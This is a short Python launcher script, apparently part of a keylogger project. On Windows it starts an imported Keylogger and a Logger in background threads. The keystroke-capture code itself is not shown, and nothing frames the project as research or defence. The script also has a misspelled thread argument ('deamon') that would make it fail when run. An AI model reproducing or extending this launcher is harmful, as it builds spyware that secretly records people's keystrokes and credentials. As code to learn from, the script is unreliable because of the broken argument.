import os
from threading import Thread
from src.utils import Keylogger, Logger


def run_keylogger():
  keylogger = Keylogger()
  keylogger.start()


def run_logger():
  logger = Logger()
  logger.start()


if __name__ == "__main__":
  if os.name == "nt":
    keylogger_thread = Thread(target=run_keylogger, daemon=True)
    keylogger_thread.start()

    logger_thread = Thread(target=run_logger, deamon=True)
    logger_thread.start()